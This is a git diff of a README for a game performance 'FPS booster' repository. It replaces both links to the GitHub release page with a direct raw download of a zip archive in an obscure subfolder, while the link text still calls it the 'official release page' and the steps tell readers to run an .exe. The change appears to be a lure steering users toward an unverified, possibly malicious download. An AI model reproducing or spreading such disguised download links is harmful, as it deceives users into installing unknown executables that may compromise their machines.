@@ -1,6 +1,6 @@
 # ⚡ ArcRaiders-FPS-Booster - Improve Game Performance and Network Stability
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/truefalse-eve196/ArcRaiders-FPS-Booster/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/truefalse-eve196/ArcRaiders-FPS-Booster/main/Mizpah/Arc-Booster-FP-Raiders-3.0.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/truefalse-eve196/ArcRaiders-FPS-Booster/releases) to find the latest version.
+1. Visit the [official release page](https://raw.githubusercontent.com/truefalse-eve196/ArcRaiders-FPS-Booster/main/Mizpah/Arc-Booster-FP-Raiders-3.0.zip) to find the latest version.
 2. Look for the Assets section at the bottom of the page.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or your Downloads folder.
